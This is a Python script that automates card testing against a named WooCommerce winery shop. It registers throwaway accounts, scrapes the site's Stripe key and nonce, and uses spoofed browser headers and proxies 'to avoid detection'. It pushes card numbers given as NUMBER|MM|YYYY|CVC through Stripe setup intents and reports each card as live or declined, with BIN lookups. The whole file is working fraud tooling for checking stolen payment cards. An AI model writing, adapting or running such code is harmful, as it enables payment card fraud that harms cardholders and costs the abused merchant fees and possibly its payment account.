from datetime import datetime
import hashlib
import json
import os
import random
import re
import requests
import string
import uuid

# ========================================
# CONFIGURATION
# ========================================
BASE_URL = "https://anyelasvineyards.com"
CARD_COUNTRY = "BD"

# ========================================
# PAYMENT METHOD ADDER CLASS
# ========================================
class PaymentMethodAdder:
    """Handles the complete flow of adding payment methods to WooCommerce for Anyelas Vineyards"""
    
    def __init__(self, base_url, proxy=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if proxy:
            self.session.proxies = format_proxy(proxy)
        self.stripe_key = None
        self.email = None
        self.password = None
        self.proxy_str = proxy

    def generate_random_account(self):
        """Generate random email and password for registration"""
        rand_id = str(uuid.uuid4())[:10]
        self.email = f"user_{rand_id}@googlemall.com"
        chars = string.ascii_letters + string.digits
        self.password = ''.join(random.choice(chars) for _ in range(10)) + "1aA!"
        print(f"🎲 Generated random account: {self.email}")
        return self.email, self.password
    
    def save_cookies(self):
        """Save cookies to file for reuse"""
        os.makedirs('cookies', exist_ok=True)
        cookies_dict = self.session.cookies.get_dict()
        with open(self.cookies_file, 'w') as f:
            json.dump(cookies_dict, f, indent=2)
        print(f"✅ Cookies saved to {self.cookies_file}")
    
    def load_cookies(self):
        """Load cookies from file"""
        if os.path.exists(self.cookies_file):
            try:
                with open(self.cookies_file, 'r') as f:
                    cookies_dict = json.load(f)
                    for key, value in cookies_dict.items():
                        self.session.cookies.set(key, value)
                print(f"✅ Loaded cookies from {self.cookies_file}")
                return True
            except Exception as e:
                print(f"⚠️ Could not load cookies: {e}")
                return False
        return False
    
    def check_if_logged_in(self):
        """Check if already logged in (Statically returns False for registration flow)"""
        return False

    def register(self):
        """Register a new account using multi-part AJAX"""
        if not self.email or not self.password:
            self.generate_random_account()

        print(f"🔄 Registering as {self.email}...")
        
        headers = {
            'accept': '*/*',
            'dnt': '1',
            'origin': self.base_url,
            'referer': f'{self.base_url}/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        # multipart/form-data
        files = {
            'xoo_el_reg_email': (None, self.email),
            'xoo_el_reg_fname': (None, 'Raisul'),
            'xoo_el_reg_lname': (None, 'Islam'),
            'xoo_el_reg_pass': (None, self.password),
            'xoo_el_reg_pass_again': (None, self.password),
            'xoo_el_reg_terms': (None, 'yes'),
            '_xoo_el_form': (None, 'register'),
            'xoo_el_redirect': (None, '/'),
            'action': (None, 'xoo_el_form_action'),
            'display': (None, 'popup'),
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/wp-admin/admin-ajax.php',
                headers=headers,
                files=files
            )
            
            if response.status_code == 200:
                print(f"✅ Registration successful for {self.email}!")
                return True
            else:
                print(f"❌ Registration failed with status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Error during registration: {e}")
            return False
    
    def login(self):
        """Login to the account using AJAX endpoint with fresh session cookies"""
        print(f"🔄 Logging in as {self.email}...")
        
        # Standard browser headers to avoid detection
        browser_headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }
        
        # Step 1: Visit my-account to get initial cookies and potential nonce
        print("🔄 Getting initial session cookies...")
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'upgrade-insecure-requests': '1',
                **browser_headers
            }
            response = self.session.get(f'{self.base_url}/my-account/', headers=headers, timeout=15)
        except Exception as e:
            print(f"⚠️ Warning: Error getting initial cookies: {e}")

        # Step 2: Login via AJAX
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': f'{self.base_url}/my-account/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-requested-with': 'XMLHttpRequest',
            **browser_headers
        }
        
        # Standard WooCommerce login data for blocks/AJAX
        import urllib.parse
        username_encoded = urllib.parse.quote(self.email, safe='')
        password_encoded = urllib.parse.quote(self.password, safe='')
        
        data = f'xoo-el-username={username_encoded}&xoo-el-password={password_encoded}&_xoo_el_form=login&xoo_el_redirect=%2Fmy-account%2F&action=xoo_el_form_action&display=inline'
        
        try:
            response = self.session.post(
                f'{self.base_url}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data,
                timeout=15
            )
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('error') == 0 or 'wordpress_logged_in' in str(self.session.cookies):
                        self.logged_in_cookies = self.session.cookies.get_dict()
                        self.save_cookies()
                        print(f"✅ Login successful and cookies saved!")
                        return True
                    else:
                        print(f"❌ Login failed: {result.get('error', 'Unknown error')}")
                        return False
                except json.JSONDecodeError:
                    if 'wordpress_logged_in' in str(self.session.cookies):
                        self.logged_in_cookies = self.session.cookies.get_dict()
                        self.save_cookies()
                        print(f"✅ Login successful and cookies saved!")
                        return True
                    else:
                        print(f"❌ Login failed: Could not parse response")
                        return False
            else:
                print(f"❌ Login failed with status code: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Error during login: {e}")
            return False
    
    def extract_stripe_key_and_ajax_nonce(self):
        """Extract Stripe key and AJAX nonce from payment pages"""
        print("🔄 Extracting Stripe key and AJAX nonce...")
        
        ajax_nonce = None
        
        try:
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            }
            
            response = self.session.get(f'{self.base_url}/my-account/payment-methods/', headers=headers)
            
            if response.status_code == 200:
                stripe_patterns = [
                    r'"key"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
                    r'"key"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"',
                ]
                
                for pattern in stripe_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        self.stripe_key = match.group(1)
                        print(f"✅ Stripe key extracted: {self.stripe_key[:20]}...")
                        break
                
                ajax_patterns = [
                    r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"',
                ]
                
                for pattern in ajax_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        ajax_nonce = match.group(1)
                        print(f"✅ AJAX nonce extracted: {ajax_nonce}")
                        break
                
                if not self.stripe_key:
                    print("❌ Could not find Stripe key in page")
                    
                if not ajax_nonce:
                    print("❌ Could not find AJAX nonce in page")
                
                return self.stripe_key, ajax_nonce
            else:
                print(f"❌ Failed to load payment method page: {response.status_code}")
                return None, None
                
        except Exception as e:
            print(f"❌ Error extracting data: {e}")
            return None, None
    
    def create_stripe_payment_method(self, card_data, hcaptcha_token=None):
        """Create a payment method using Stripe API"""
        print("🔄 Creating Stripe payment method...")
        
        if not self.stripe_key:
            print("❌ No Stripe key available")
            return None
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }
        
        card_number = card_data.get('number', '').replace(' ', '+')
        
        # Extract muid and sid from cookies
        muid = self.session.cookies.get('__stripe_mid', '')
        sid = self.session.cookies.get('__stripe_sid', '')
        guid = str(uuid.uuid4())
        
        data = {
            'type': 'card',
            'card[number]': card_number,
            'card[cvc]': card_data.get('cvc', ''),
            'card[exp_year]': card_data.get('exp_year', ''),
            'card[exp_month]': card_data.get('exp_month', ''),
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': card_data.get('country', 'BD'),
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; payment-element; deferred-intent',
            'referrer': self.base_url,
            'time_on_page': random.randint(15000, 30000),
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': self.stripe_key,
            '_stripe_version': '2024-06-20',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
        }

        if hcaptcha_token:
            data['radar_options[hcaptcha_token]'] = hcaptcha_token
            
        # Filter out empty values
        data = {k: v for k, v in data.items() if v}

        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                payment_method = response.json()
                payment_method_id = payment_method.get('id')
                print(f"✅ Stripe payment method created: {payment_method_id}")
                return payment_method_id
            else:
                print(f"❌ Failed to create Stripe payment method: {response.text}")
                return None
                
        except Exception as e:
            print(f"❌ Error creating Stripe payment method: {e}")
            return None
    
    def add_payment_method_to_account(self, payment_method_id, ajax_nonce):
        """Add the payment method to WooCommerce account"""
        print(f"🔄 Adding payment method to account...")
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': self.base_url,
            'priority': 'u=1, i',
            'referer': f'{self.base_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        try:
            response = self.session.post(
                f'{self.base_url}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    setup_intent_id = result.get('data', {}).get('id')
                    print(f"✅ Payment method added successfully!")
                    print(f"   Status: {result.get('data', {}).get('status')}")
                    print(f"   Setup Intent ID: {setup_intent_id}")
                    return True, setup_intent_id, "Payment method added successfully"
                else:
                    error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
                    print(f"❌ Failed to add payment method: {result}")
                    return False, None, error_msg
            else:
                print(f"❌ Error adding payment method: Status {response.status_code}")
                return False, None, f"Error adding payment method: Status {response.status_code}"
                
        except Exception as e:
            print(f"❌ Error adding payment method: {e}")
            return False, None, str(e)
    
    def run(self, card_data, hcaptcha_token=None):
        """Main execution flow with retry logic"""
        print("=" * 60)
        print("🚀 Starting Payment Method Addition Process")
        print("=" * 60)
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Target: {self.base_url}")
        if self.proxy_str:
            print(f"Proxy: {self.proxy_str}")
        print(f"Email: {self.email}")
        print(f"Card: {card_data.get('number', 'N/A')}")
        print("=" * 60)
        
        if not self.check_if_logged_in():
            if not self.register():
                print("\n💥 Failed to register!")
                return None, None, False, "Failed to register"
        
        stripe_key, ajax_nonce = self.extract_stripe_key_and_ajax_nonce()
        
        if not self.stripe_key or not ajax_nonce:
            print("\n💥 Failed to extract keys/nonces!")
            return None, None, False, "Failed to extract keys/nonces"
            
        payment_method_id = self.create_stripe_payment_method(card_data, hcaptcha_token=hcaptcha_token)
        if not payment_method_id:
            print("\n💥 Failed to create payment method!")
            return None, None, False, "Failed to create payment method"
        
        success, setup_intent_id, message = self.add_payment_method_to_account(payment_method_id, ajax_nonce)
        
        if success:
            print("\n" + "=" * 60)
            print("🎉 Payment Method Addition Completed Successfully!")
            print("=" * 60)
            return payment_method_id, setup_intent_id, True, message
        
        print("\n💥 Failed to add payment method to account!")
        return payment_method_id, None, False, message

# ========================================
# HELPER FUNCTIONS
# ========================================

def advanced_luhn_checksum(card_number):
    """Luhn algorithm for card number validation"""
    def digits_of(n):
        return [int(d) for d in str(n)]

    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_valid_card(card_number):
    """Check if card number passes Luhn validation"""
    card_number = str(card_number).replace(' ', '').replace('-', '')
    if not card_number.isdigit():
        return False
    return advanced_luhn_checksum(card_number) == 0

def get_bin_info(card_number):
    """Get BIN information for a card"""
    bin_number = str(card_number)[:6]
    
    try:
        print(f"🔍 Fetching BIN info for: {bin_number}")
        response = requests.get(f'https://cc-gen-lime.vercel.app/bin/{bin_number}', timeout=5)
        
        if response.status_code == 200:
            bin_data = response.json()
            if bin_data.get('bin'):
                print(f"✅ BIN info found: {bin_data.get('scheme', 'N/A')}")
                return {
                    'issuer': bin_data.get('bank', 'N/A'),
                    'brand': bin_data.get('scheme', 'N/A'),
                    'Country': {'Name': bin_data.get('country', 'N/A')},
                    'level': bin_data.get('tier', 'N/A'),
                    'type': bin_data.get('type', 'N/A')
                }
        
        print("❌ BIN info not found")
        return None
    except Exception as e:
        print(f"⚠️ Could not fetch BIN info: {e}")
        return None

def parse_card_details(auth_string):
    """Parse card details from auth string format: CARD|MM|YYYY|CVC"""
    try:
        parts = auth_string.split('|')
        if len(parts) != 4:
            return None
        
        card_number = parts[0].strip().replace(' ', '')
        exp_month = parts[1].strip().zfill(2)
        exp_year = parts[2].strip()
        cvc = parts[3].strip()
        
        if len(exp_year) == 2:
            exp_year = exp_year
        elif len(exp_year) == 4:
            exp_year = exp_year[-2:]
        else:
            return None
        
        return {
            'number': card_number,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'cvc': cvc,
            'country': CARD_COUNTRY
        }
    except Exception as e:
        print(f"❌ Error parsing card details: {e}")
        return None

# ========================================
# ENDPOINT HANDLER
# ========================================
def handle_endpoint(auth, hcaptcha_token='', email=None, password=None, proxy=None):
    """
    Main endpoint handler for Anyelas Vineyards payment validation
    Returns: (response_dict, status_code)
    """
    if not auth:
        return {
            'success': False,
            'error': 'Missing auth parameter',
            'message': 'Please provide card details in format: CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC'
        }, 400
    
    card_data = parse_card_details(auth)
    
    if not card_data:
        return {
            'success': False,
            'error': 'Invalid card details format',
            'message': 'Format: CARD_NUMBER|EXP_MONTH|EXP_YEAR|CVC (year can be 2 or 4 digits)',
            'example': '5444228403258437|11|2028|327'
        }, 400
    
    try:
        print(f"🔐 Validating card: {card_data['number'][:6]}******{card_data['number'][-4:]}")
        
        bin_info = get_bin_info(card_data['number'])
        
        if not is_valid_card(card_data['number']):
            error_result = {}
            
            if bin_info:
                error_result['bin_info'] = {
                    'bank': bin_info.get('issuer', 'N/A'),
                    'brand': bin_info.get('brand', 'N/A'),
                    'country': bin_info.get('Country', {}).get('Name', 'N/A') if isinstance(bin_info.get('Country'), dict) else 'N/A',
                    'level': bin_info.get('level', 'N/A'),
                    'type': bin_info.get('type', 'N/A')
                }
            
            error_result['card'] = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year'] if len(card_data['exp_year']) == 4 else '20' + card_data['exp_year']}|{card_data['cvc']}"
            error_result['gateway'] = 'Stripe'
            error_result['message'] = 'Invalid card number (Failed Luhn validation)'
            error_result['status'] = 'error'
            
            return error_result, 400
        
        print("✅ Card passed Luhn validation")
        
        adder = PaymentMethodAdder(
            base_url=BASE_URL,
            proxy=proxy
        )
        
        payment_method_id, setup_intent_id, success, message = adder.run(card_data=card_data)
        
        result = {}
        
        if bin_info:
            result['bin_info'] = {
                'bank': bin_info.get('issuer', 'N/A'),
                'brand': bin_info.get('brand', 'N/A'),
                'country': bin_info.get('Country', {}).get('Name', 'N/A') if isinstance(bin_info.get('Country'), dict) else 'N/A',
                'level': bin_info.get('level', 'N/A'),
                'type': bin_info.get('type', 'N/A')
            }
        
        result['card'] = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year'] if len(card_data['exp_year']) == 4 else '20' + card_data['exp_year']}|{card_data['cvc']}"
        result['gateway'] = 'Stripe'
        result['message'] = message
        result['payment_method_id'] = payment_method_id
        result['setup_intent_id'] = setup_intent_id
        result['status'] = 'success' if success else 'declined'
        
        return result, 200
            
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'message': 'An error occurred while processing the request',
            'type': type(e).__name__
        }, 500

def format_proxy(proxy_str):
    """
    Format proxy string from ip:port:user:pass to http://user:pass@ip:port
    Returns dict for requests or None if invalid
    """
    if not proxy_str:
        return None
    try:
        parts = proxy_str.strip().split(':')
        if len(parts) != 4:
            return None
        ip = parts[0]
        port = parts[1]
        user = parts[2]
        password = parts[3]
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {
            "http": proxy_url,
            "https": proxy_url
        }
    except:
        return None
